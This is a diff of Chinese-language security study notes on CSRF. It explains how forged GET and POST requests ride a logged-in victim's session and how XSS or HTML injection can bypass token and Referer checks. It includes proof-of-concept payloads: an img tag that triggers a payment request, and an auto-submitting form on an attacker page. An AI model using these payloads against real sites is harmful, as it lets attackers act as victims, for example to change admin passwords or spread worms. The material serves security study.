@@ -1,31 +1,31 @@
 ### 简介
 
-Cross-Site Request Forgery(CSRF)，跨站请求伪造攻击。
-
-缩写为 CSRF/XSRF，也被称为one click attack/session riding
+跨站请求伪造Cross-Site Request Forgery(CSRF)，也被称为one click attack/session riding
 
 ### 原理
 
 "借刀杀人"
 
-CSRF通过构造get/post等请求，设法使已登录用户victim不知情的情况下，以受害者victim的身份发出"非其主观意愿的"HTTP请求。
+CSRF通过构造get/post等请求，设法使已登录用户victim不知情的情况下，设法让victim携带自身Cookie发出"非其主观意愿的"HTTP请求
 
-* CSRF局限性:利用单一的CSRF漏洞能发起HTTP请求，但攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
+* CSRF局限性:如果只有单一的CSRF漏洞，攻击者无法得到该HTTP请求的内容(Cookie可用但无法查看)，也无法得到任何回显(HTTP响应等)
 * CSRF扩展性:可联合其他漏洞(如XSS)进行攻击效果最大化
 
-### CSRF类型 - 发出GET请求
+### CSRF类型与利用方式
 
-  * 攻击思路 设法让victim的浏览器发出该GET请求
-     * 社工诱骗 - 直接 使victim点击构造的url 发出GET请求 `http://get.csrf.com/payto?name=hacker&moneynumb=100`
-     * 漏洞联合 - 利用其他漏洞 无交互地利用CSRF漏洞
-       * XSS + CSRF 构造并发送GET请求
-       * 同源站点的html注入漏洞 发起CSRF(无Referer头)
-       * 不同源站点的html注入漏洞
-         * 使victim访问攻击者可控的第三方网站`http://3.com`(可注入html代码即可) 从而使victim发出GET请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)
+* CSRF类型
+  * GET - 利用方式 使victim点击构造的url 发出GET请求 `http://get.csrf.com/payto?name=hacker&moneynumb=100`
+  * POST - 利用方式 尝试转变为GET (可尝试将post请求体改成get形式放至url参数中 如果可以正常响应 则可以使用GET请求进行csrf攻击)
+* 漏洞联合 - 通过XSS间接利用CSRF
+   * 1.利用自身域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制为后端判断CSRFtoken的值，使用JavaScript找到CSRFtoken参数值并构造出"合法的"GET/POST请求 全程不存在跨域问题
+   * 2.利用自身/兄弟/父子域名的XSS漏洞绕过CSRF防御机制 - 有的anti-CSRF机制是后端通过判断Referer的值，如果Referer的值 是自身/兄弟/父子域名下的url 就是"合法"请求
+   * 3.利用任意第三方域名的XSS漏洞 - 使victim访问攻击者可控的第三方网站`https://3.com` 该第三方站点上用javascript构造GET请求(通过img标签 使victim发出GET请求) POST请求(构造目标站的表单数据并自动提交 使victim发出POST请求)
+   * html注入漏洞 (参考通过XSS间接利用CSRF)
 
-#### 流程
 
-在 http://www.3.com/demo 中注入以下html代码:
+#### 利用任意第三方域名的XSS漏洞 发出GET请求
+
+通过javascript 在 http://www.3.com/demo 中注入以下html代码:
 ```
 <img src="http://get.csrf.com/payto?name=hacker&moneynumb=100">
 ```
@@ -34,7 +34,7 @@ victim访问http://www.3.com/demo 则发出GET请求
 
 
 get.csrf.com收到GET请求:
-请求中的Referer说明了该get请求是从哪个url发起的
+请求中的Referer头说明了该get请求是从第三方url发起的 (如果后端验证Referer的值 则CSRF利用失败)
 ```
 GET /payto?name=hacker&moneynumb=100 HTTP/1.1
 Host: get.csrf.com
@@ -46,19 +46,9 @@ Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 ```
        
-### CSRF类型 - 发出POST请求
+#### 利用任意第三方域名的XSS漏洞 发出POST请求
 
-  * 攻击思路 设法让victim的浏览器发出该POST请求
-    * 转变为Get更容易攻击 (可尝试将post请求改成get形式的请求 如果可以正常响应 则可以使用get请求进行csrf攻击)
-    * 漏洞联合 - 无交互地利用CSRF漏洞
-      * XSS + CSRF  构造并发送该POST请求
-      * 同源站点的html注入漏洞 发起CSRF(无Referer头)
-      * 不同源站点的html注入漏洞
-        * 使victim访问攻击者可控的第三方网站`https://3.com`(可注入html代码即可) 从而使victim发出POST请求(Referer头标明了请求发起源站url 如果后端验证Referer则CSRF利用失败)
-
-#### 流程
-
-在 https://3.com 中注入以下html代码:
+通过javascript 在 https://3.com 中注入以下html代码:
 ```
   <script>history.pushState('', '', '/')</script>
     <form name="frm" action="https://post.csrf.com/search" method="POST">
@@ -73,8 +63,12 @@ Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 victim访问https://3.com 则发出POST请求
 
 
-post.csrf.com收到POST请求:
-可从Origin看出HTTP请求发起自https://3.com
+post.csrf.com收到POST请求:并可看出HTTP请求从哪里发起
+```
+Origin: https://3.com
+Referer: https://3.com/
+```
+
 ```
 POST /search HTTP/1.1
 Host: post.csrf.com
@@ -86,7 +80,7 @@ Upgrade-Insecure-Requests: 1
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Referer: https://cn.bing.com/
+Referer: https://3.com/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
 
@@ -95,14 +89,11 @@ ip=1.1.1.1&offset=0&limit=20
 
 ### 漏洞影响
 
-* 主要攻击场景(针对没有CSRF防御机制的网站)
-  * 利用victim的身份进行操作
-    * 修改管理员密码 - 使管理员点击构造的链接 即可修改其密码
-    * 新建管理员账号 - 使管理员点击构造的链接 即可新增管理员
-  * 漏洞联合
-    * XSS + CSRF
-      * 社交站点蠕虫 - 如果"向好友发送消息"的HTTP请求中没有设置CSRF-token请求头 则可结合XSS可构造出XSS+CSRF蠕虫 影响极大
-      * 拒绝服务 - 如果XSS能打到管理员后台 且管理员注销动作无CSRF防御机制 则可构造payload使管理员一登录就注销
+* CSRF攻击场景 利用victim的身份进行操作
+  * 修改管理员密码 - 使管理员点击构造的链接 即可修改其密码
+  * 新建管理员账号 - 使管理员点击构造的链接 即可新增管理员
+  * 社交站点蠕虫(XSS结合CSRF) - 如果"向好友发送消息"的HTTP请求中没有设置CSRF-token请求头 则可结合XSS可构造出XSS+CSRF蠕虫 影响极大
+  * 拒绝服务(XSS结合CSRF) - 如果XSS能打到管理员后台 且管理员注销动作无CSRF防御机制 则可构造payload使管理员一登录就注销
 
 ### 测试
 
